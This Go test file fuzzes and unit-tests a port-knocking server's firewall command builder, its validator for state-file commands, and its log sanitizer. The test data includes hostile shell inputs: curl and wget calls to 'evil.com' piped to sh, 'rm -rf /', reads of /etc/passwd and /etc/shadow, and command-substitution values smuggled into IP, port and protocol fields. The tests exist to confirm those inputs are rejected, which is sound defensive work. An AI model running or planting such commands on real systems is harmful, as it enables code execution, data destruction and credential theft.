// Copyright (c) 2024-2026 Jack L. (Cpt-JackL) (https://jack-l.com)
// SPDX-License-Identifier: MIT
package server

import (
	"encoding/json"
	"fmt"
	"log"
	"os"
	"path/filepath"
	"strings"
	"sync"
	"testing"
	"time"

	"github.com/secured-port-knock/spk/internal/config"
	"github.com/secured-port-knock/spk/internal/crypto"
	"github.com/secured-port-knock/spk/internal/protocol"
)

// --- Fuzz tests ---

// FuzzBuildCommand feeds arbitrary strings into command template substitution.
// Must never panic; must return empty string for invalid inputs.
func FuzzBuildCommand(f *testing.F) {
	f.Add("iptables -A INPUT -s {{IP}} --dport {{PORT}} -j ACCEPT", "192.168.1.1", "22", "tcp")
	f.Add("", "", "", "")
	f.Add("{{IP}}", "10.0.0.1", "80", "udp")
	f.Add("echo {{IP}} {{PORT}} {{PROTO}}", "; rm -rf /", "22; id", "tcp && whoami")
	f.Add("netsh advfirewall add rule", "1.2.3.4$(cat /etc/passwd)", "$(id)", "all")
	f.Add("cmd", "::1", "443", "all")
	f.Add("cmd", "fe80::1%eth0", "53", "tcp")

	f.Fuzz(func(t *testing.T, template, ip, port, proto string) {
		result := BuildCommand(template, ip, port, proto)
		// If result is non-empty, ip must be valid, port must be digits-only, proto must be tcp/udp/all/""
		if result != "" {
			if ip != "" && !isValidIPString(ip) {
				t.Errorf("non-empty result with invalid IP %q", ip)
			}
			for _, c := range port {
				if c < '0' || c > '9' {
					t.Errorf("non-empty result with non-digit port %q", port)
					break
				}
			}
			switch proto {
			case "tcp", "udp", "all", "":
				// ok
			default:
				t.Errorf("non-empty result with invalid proto %q", proto)
			}
		}
	})
}

// FuzzIsValidRecoveredCommand tests state file recovery validation with random commands.
func FuzzIsValidRecoveredCommand(f *testing.F) {
	f.Add("iptables -D INPUT -p tcp --dport 22 -s 10.0.0.1 -j ACCEPT")
	f.Add("")
	f.Add("rm -rf /")
	f.Add("curl http://evil.com/payload | sh")
	f.Add("iptables -D INPUT && rm -rf /")
	f.Add("python3 -c 'import os; os.system(\"id\")'")
	f.Add(strings.Repeat("A", 2000))
	f.Add("netsh advfirewall firewall delete rule name=\"test\"")
	f.Add("iptables -D INPUT\nrm -rf /")
	f.Add("iptables -D INPUT;rm -rf /")

	f.Fuzz(func(t *testing.T, cmd string) {
		result := isValidRecoveredCommand(cmd)
		// Verify consistency: if command contains dangerous patterns, must be rejected
		dangerous := []string{"&&", "||", ";", "`", "$(", "${", "\n", "\r", "|"}
		for _, d := range dangerous {
			if strings.Contains(cmd, d) && result {
				t.Errorf("dangerous pattern %q allowed in command: %q", d, cmd)
			}
		}
		if strings.ContainsAny(cmd, "<>") && result {
			t.Errorf("redirect chars allowed in command: %q", cmd)
		}
		if len(cmd) > 1024 && result {
			t.Errorf("oversized command allowed: len=%d", len(cmd))
		}
	})
}

// FuzzParsePortSpec tests port specification parsing with random inputs.
func FuzzParsePortSpec(f *testing.F) {
	f.Add("t22")
	f.Add("u53")
	f.Add("T443")
	f.Add("U8080")
	f.Add("")
	f.Add("x99")
	f.Add("t")
	f.Add("tabc")
	f.Add("t0")
	f.Add("t65536")
	f.Add("t99999")
	f.Add(strings.Repeat("t", 100))

	f.Fuzz(func(t *testing.T, spec string) {
		proto, port, err := parsePortSpec(spec)
		if err == nil {
			// If parse succeeded, validate the outputs
			if proto != "tcp" && proto != "udp" {
				t.Errorf("invalid proto %q for spec %q", proto, spec)
			}
			if port == "" {
				t.Errorf("empty port for spec %q", spec)
			}
			// Port must be all digits
			for _, c := range port {
				if c < '0' || c > '9' {
					t.Errorf("non-digit in port %q for spec %q", port, spec)
					break
				}
			}
		}
	})
}

// FuzzSanitizeForLog tests log sanitization with arbitrary input.
func FuzzSanitizeForLog(f *testing.F) {
	f.Add("normal text")
	f.Add("")
	f.Add("\x00\x01\x02\x03")
	f.Add("hello\nworld")
	f.Add("\x1b[31mred\x1b[0m")
	f.Add(strings.Repeat("\n", 1000))

	f.Fuzz(func(t *testing.T, s string) {
		result := sanitizeForLog(s)
		// Result must not contain control characters
		for i, r := range result {
			if r < 0x20 || r == 0x7f {
				t.Errorf("control char %d (0x%02x) at position %d in result", r, r, i)
			}
		}
		// Result length must equal input length (1:1 replacement)
		if len([]rune(result)) != len([]rune(s)) {
			t.Errorf("length mismatch: input %d runes, output %d runes", len([]rune(s)), len([]rune(result)))
		}
	})
}

// --- Property-based tests ---

// TestBuildCommand_InjectionVectors comprehensive injection test suite.
func TestBuildCommand_InjectionVectors(t *testing.T) {
	template := "iptables -A INPUT -p {{PROTO}} --dport {{PORT}} -s {{IP}} -j ACCEPT"

	// All of these should result in empty output (rejected)
	injectionIPs := []string{
		"1.2.3.4; rm -rf /",
		"1.2.3.4 && whoami",
		"1.2.3.4 || id",
		"1.2.3.4 | cat /etc/shadow",
		"1.2.3.4`cat /etc/passwd`",
		"1.2.3.4$(id)",
		"${IFS}cat${IFS}/etc/passwd",
		"10.0.0.1\nwhoami",
		"10.0.0.1\rwhoami",
		"' OR 1=1 --",
		"\" OR 1=1 --",
		"<script>alert(1)</script>",
		"../../../etc/passwd",
		"10.0.0.1%0Awhoami",
	}

	for _, ip := range injectionIPs {
		result := BuildCommand(template, ip, "22", "tcp")
		if result != "" {
			t.Errorf("injection IP %q produced non-empty command: %q", ip, result)
		}
	}

	// Invalid ports
	injectionPorts := []string{
		"22; rm -rf /",
		"22abc",
		"22 && id",
		"-1",
		"abc",
		"22$(id)",
	}

	for _, port := range injectionPorts {
		result := BuildCommand(template, "10.0.0.1", port, "tcp")
		if result != "" {
			t.Errorf("injection port %q produced non-empty command: %q", port, result)
		}
	}

	// Invalid protocols
	injectionProtos := []string{
		"tcp; whoami",
		"tcp && id",
		"tcp || cat /etc/passwd",
		"icmp",
		"ALL",
		"tcp udp",
	}

	for _, proto := range injectionProtos {
		result := BuildCommand(template, "10.0.0.1", "22", proto)
		if result != "" {
			t.Errorf("injection proto %q produced non-empty command: %q", proto, result)
		}
	}
}

// TestIsValidRecoveredCommand_ComprehensiveBlocklist tests all blocked patterns.
func TestIsValidRecoveredCommand_ComprehensiveBlocklist(t *testing.T) {
	base := "iptables -D INPUT -p tcp --dport 22 -s 10.0.0.1 -j ACCEPT"

	// Each of these injections should be caught
	injections := []struct {
		name   string
		inject string
	}{
		{"semicolon", base + "; rm -rf /"},
		{"and_chain", base + " && whoami"},
		{"or_chain", base + " || id"},
		{"pipe", base + " | tee /tmp/evil"},
		{"backtick", base + " `whoami`"},
		{"dollar_paren", base + " $(id)"},
		{"dollar_brace", base + " ${HOME}"},
		{"newline", base + "\nrm -rf /"},
		{"carriage_return", base + "\rwhoami"},
		{"redirect_out", base + " > /tmp/evil"},
		{"redirect_in", base + " < /etc/passwd"},
		{"too_long", strings.Repeat("A", 1025)},
	}

	for _, tt := range injections {
		t.Run(tt.name, func(t *testing.T) {
			if isValidRecoveredCommand(tt.inject) {
				t.Errorf("injection %q was not caught", tt.name)
			}
		})
	}
}

// TestIsValidRecoveredCommand_AllowlistCoverage verifies all allowed prefixes.
func TestIsValidRecoveredCommand_AllowlistCoverage(t *testing.T) {
	allowedCommands := []string{
		"iptables -D INPUT -p tcp --dport 22 -s 10.0.0.1 -j ACCEPT",
		"ip6tables -D INPUT -p tcp --dport 22 -s ::1 -j ACCEPT",
		"nft delete rule inet filter input handle 42",
		"ufw delete allow from 10.0.0.1 to any port 22",
		"firewall-cmd --remove-rich-rule='test'",
		"pfctl -a spk/test -F rules",
		"/sbin/iptables -D INPUT -j ACCEPT",
		"/usr/sbin/iptables -D INPUT -j ACCEPT",
		"/sbin/ip6tables -D INPUT -j ACCEPT",
		"/usr/sbin/ip6tables -D INPUT -j ACCEPT",
		"/usr/sbin/nft delete rule",
		"/usr/sbin/ufw delete allow",
		"netsh advfirewall firewall delete rule name=test",
		"netsh.exe advfirewall firewall delete rule name=test",
		"/sbin/pfctl -a spk -F rules",
	}

	for _, cmd := range allowedCommands {
		if !isValidRecoveredCommand(cmd) {
			t.Errorf("valid command rejected: %q", cmd)
		}
	}
}

// TestIsValidRecoveredCommand_UnknownBinaries verifies unknown binaries are rejected.
func TestIsValidRecoveredCommand_UnknownBinaries(t *testing.T) {
	unknownCmds := []string{
		"curl http://evil.com/payload",
		"wget http://evil.com/malware",
		"python3 -c 'import os'",
		"bash -c 'rm -rf /'",
		"sh -c 'id'",
		"/bin/sh -c 'whoami'",
		"powershell -Command Get-Process",
		"echo hello",
		"cat /etc/passwd",
		"chmod 777 /",
	}

	for _, cmd := range unknownCmds {
		if isValidRecoveredCommand(cmd) {
			t.Errorf("unknown binary allowed: %q", cmd)
		}
	}
}

// TestTracker_ConcurrentAccess tests thread safety of the tracker.
func TestTracker_ConcurrentAccess(t *testing.T) {
	statePath := filepath.Join(t.TempDir(), "state.json")
	logger := log.New(os.Stderr, "", 0)
	tracker := NewTracker(statePath, logger, true)

	var wg sync.WaitGroup
	for i := 0; i < 50; i++ {
		wg.Add(1)
		go func(id int) {
			defer wg.Done()
			ip := fmt.Sprintf("10.0.0.%d", id%256)
			entry := &PortEntry{
				IP:        ip,
				Port:      fmt.Sprintf("t%d", 1000+id),
				Proto:     "tcp",
				PortNum:   fmt.Sprintf("%d", 1000+id),
				OpenedAt:  time.Now(),
				ExpiresAt: time.Now().Add(1 * time.Hour),
				CloseCmd:  "echo close",
			}
			tracker.Add(entry)
			_ = tracker.GetByIP(ip)
			_ = tracker.GetAll()
			_ = tracker.GetExpired()
			_ = tracker.Has(ip, entry.PortNum, "tcp")
			tracker.RefreshExpiry(ip, entry.PortNum, "tcp", time.Now().Add(2*time.Hour))
			tracker.Remove(ip, entry.PortNum, "tcp")
		}(i)
	}
	wg.Wait()
}

// TestTracker_TryReserve tests atomic reservation.
func TestTracker_TryReserve(t *testing.T) {
	statePath := filepath.Join(t.TempDir(), "state.json")
	logger := log.New(os.Stderr, "", 0)
	tracker := NewTracker(statePath, logger, true)

	entry := &PortEntry{
		IP: "10.0.0.1", Port: "t22", Proto: "tcp", PortNum: "22",
		ExpiresAt: time.Now().Add(1 * time.Hour),
	}

	// First reservation should succeed
	reserved, existing := tracker.TryReserve(entry)
	if !reserved {
		t.Error("first reservation should succeed")
	}
	if existing != nil {
		t.Error("no existing entry expected")
	}

	// Second reservation with same key should fail
	entry2 := &PortEntry{
		IP: "10.0.0.1", Port: "t22", Proto: "tcp", PortNum: "22",
		ExpiresAt: time.Now().Add(2 * time.Hour),
	}
	reserved2, existing2 := tracker.TryReserve(entry2)
	if reserved2 {
		t.Error("duplicate reservation should fail")
	}
	if existing2 == nil {
		t.Error("should return existing entry")
	}
}

// TestTracker_StateRecovery_MalformedJSON tests recovery from corrupted state files.
func TestTracker_StateRecovery_MalformedJSON(t *testing.T) {
	statePath := filepath.Join(t.TempDir(), "state.json")
	logger := log.New(os.Stderr, "", 0)

	malformedInputs := []string{
		"",
		"not json",
		"{",
		"[]",
		`{"key": null}`,
		`{"key": "not an entry"}`,
		strings.Repeat("{", 10000),
	}

	for _, input := range malformedInputs {
		if err := os.WriteFile(statePath, []byte(input), 0600); err != nil {
			t.Fatal(err)
		}
		// Must not panic
		tracker := NewTracker(statePath, logger, true)
		_ = tracker.GetAll()
	}
}

// TestTracker_StateRecovery_SuspiciousCommands tests state file injection prevention.
func TestTracker_StateRecovery_SuspiciousCommands(t *testing.T) {
	statePath := filepath.Join(t.TempDir(), "state.json")
	logger := log.New(os.Stderr, "", 0)

	entries := map[string]*PortEntry{
		"10.0.0.1:22:tcp": {
			IP: "10.0.0.1", Port: "t22", Proto: "tcp", PortNum: "22",
			OpenedAt:  time.Now().Add(-2 * time.Hour),
			ExpiresAt: time.Now().Add(-1 * time.Hour), // expired
			CloseCmd:  "rm -rf /",                     // malicious!
		},
	}

	data, err := json.MarshalIndent(entries, "", "  ")
	if err != nil {
		t.Fatalf("MarshalIndent: %v", err)
	}
	if err := os.WriteFile(statePath, data, 0600); err != nil {
		t.Fatal(err)
	}

	// Recovery should skip this entry due to suspicious command
	tracker := NewTracker(statePath, logger, true)
	all := tracker.GetAll()
	if len(all) != 0 {
		t.Errorf("suspicious entry should be skipped, got %d entries", len(all))
	}
}

// TestTracker_StateRecovery_OversizedFile tests rejection of oversized state files.
func TestTracker_StateRecovery_OversizedFile(t *testing.T) {
	statePath := filepath.Join(t.TempDir(), "state.json")
	logger := log.New(os.Stderr, "", 0)

	// Create a state file larger than 1 MB
	bigData := strings.Repeat("x", 1<<20+1)
	if err := os.WriteFile(statePath, []byte(bigData), 0600); err != nil {
		t.Fatal(err)
	}

	// Must not panic, should start fresh
	tracker := NewTracker(statePath, logger, true)
	all := tracker.GetAll()
	if len(all) != 0 {
		t.Errorf("oversized state file should be ignored, got %d entries", len(all))
	}
}

// --- Mutation-resilient tests ---

// TestBuildCommand_NoShellMetacharsInOutput verifies output never contains unvalidated input.
func TestBuildCommand_NoShellMetacharsInOutput(t *testing.T) {
	template := "iptables -A INPUT -s {{IP}} --dport {{PORT}} -p {{PROTO}} -j ACCEPT"

	// Valid inputs should produce clean output
	result := BuildCommand(template, "10.0.0.1", "22", "tcp")
	if result == "" {
		t.Fatal("expected non-empty result for valid inputs")
	}

	// Output should contain the exact substituted values
	if !strings.Contains(result, "10.0.0.1") {
		t.Error("output missing IP")
	}
	if !strings.Contains(result, "22") {
		t.Error("output missing port")
	}
	if !strings.Contains(result, "tcp") {
		t.Error("output missing proto")
	}

	// Output should not contain template placeholders
	if strings.Contains(result, "{{") || strings.Contains(result, "}}") {
		t.Error("output still contains template placeholders")
	}
}

// TestBuildCommand_IPv6Addresses tests various IPv6 formats.
func TestBuildCommand_IPv6Addresses(t *testing.T) {
	template := "ip6tables -A INPUT -s {{IP}} --dport {{PORT}} -j ACCEPT"

	validIPv6 := []string{
		"::1",
		"::ffff:192.168.1.1",
		"2001:db8::1",
		"fe80::1",
		"2001:0db8:0000:0000:0000:0000:0000:0001",
	}

	for _, ip := range validIPv6 {
		result := BuildCommand(template, ip, "22", "tcp")
		if result == "" {
			t.Errorf("valid IPv6 %q rejected", ip)
		}
	}
}

// TestSanitizeForLog_ANSIEscapes verifies ANSI escape sequences are sanitized.
func TestSanitizeForLog_ANSIEscapes(t *testing.T) {
	inputs := []string{
		"\x1b[31mRED\x1b[0m",    // Red text
		"\x1b[1;32mBOLD\x1b[0m", // Bold green
		"\x1b[2J",               // Clear screen
		"\x1b]0;Evil Title\x07", // Set terminal title
	}

	for _, input := range inputs {
		result := sanitizeForLog(input)
		for _, r := range result {
			if r < 0x20 || r == 0x7f {
				t.Errorf("ANSI escape not sanitized in %q -> %q", input, result)
				break
			}
		}
	}
}

// TestSanitizeForLog_PreservesASCIIPrintable verifies printable ASCII is preserved.
func TestSanitizeForLog_PreservesASCIIPrintable(t *testing.T) {
	// All printable ASCII characters
	printable := ""
	for i := 0x20; i <= 0x7E; i++ {
		printable += string(rune(i))
	}

	result := sanitizeForLog(printable)
	if result != printable {
		t.Errorf("printable ASCII altered: got %q, want %q", result, printable)
	}
}

// FuzzHandleKnock feeds arbitrary byte sequences into the complete handleKnock
// pipeline.  The fuzzer exercises decryption failure paths, packet parsing,
// command dispatch, and the panic recovery defer -- none of which must crash
// the server, consume nonces, or mutate tracker state for invalid packets.
func FuzzHandleKnock(f *testing.F) {
	// Seed corpus: valid packet bytes and obvious garbage.
	dk, err := crypto.GenerateKeyPair()
	if err != nil {
		f.Fatalf("GenerateKeyPair: %v", err)
	}

	// Build a valid seed packet to give the fuzzer a real starting point.
	if validPkt, err := protocol.BuildKnockPacket(dk.EncapsulationKey(), "127.0.0.1", "open-t22", 0); err == nil {
		f.Add(validPkt)
	}
	f.Add([]byte{})
	f.Add([]byte{0x00})
	f.Add([]byte("not a knock packet"))
	f.Add([]byte("\xff\xfe\xfd"))

	f.Fuzz(func(t *testing.T, data []byte) {
		statePath := filepath.Join(t.TempDir(), "state.json")
		stdLog := log.New(os.Stderr, "", 0)
		tracker := NewTracker(statePath, stdLog, false)
		nonceTracker := protocol.NewNonceTrackerWithLimit(2*time.Minute, 1000)
		allowedPorts := map[string]bool{"t22": true, "t443": true}
		logger := &testLogger{}

		cfg := &config.Config{
			MatchIncomingIP:     true,
			AllowCustomPort:     true,
			DefaultOpenDuration: 30,
			OpenTCPCommand:      "echo open {{PORT}} {{IP}}",
			CloseTCPCommand:     "echo close {{PORT}} {{IP}}",
			CommandTimeout:      0.1,
		}

		// Must not panic.
		handleKnock(logger, dk, cfg, nonceTracker, tracker, allowedPorts, 30, data, "127.0.0.1")

		// Invariants that must always hold regardless of input:
		// - tracker can never have MORE entries than distinct (ip, port, proto) pairs we've opened
		// - nonce tracker can never grow unbounded from a single call (at most 1 nonce per call)
		if nonceTracker.Size() > 1 {
			t.Errorf("a single handleKnock call must not insert more than 1 nonce, got %d", nonceTracker.Size())
		}
	})
}
